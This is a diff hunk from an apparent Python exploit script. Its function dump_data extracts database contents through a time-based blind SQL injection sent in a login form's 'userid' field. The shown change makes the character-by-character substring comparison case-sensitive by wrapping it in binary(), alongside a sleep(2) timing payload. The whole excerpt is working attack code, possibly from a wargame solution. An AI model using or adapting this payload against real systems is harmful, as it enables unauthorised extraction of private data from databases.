@@ -124,7 +124,7 @@ def dump_data(url, cookies, table_name, column_list):
 			flag = True
 			while flag:
 				for key in keyword:
-					value = "' or 1=1 and substring((select {} from {} limit {},1),{},1)='{}' and sleep(2)#".format(column_name, table_name, size, i, key)
+					value = "' or 1=1 and binary(substring((select {} from {} limit {},1),{},1))='{}' and sleep(2)#".format(column_name, table_name, size, i, key)
 					params = {'userid': value, 'userpw': 'test'}
 					start = time.time()
 					response = requests.post(url,data=params, cookies=cookies)
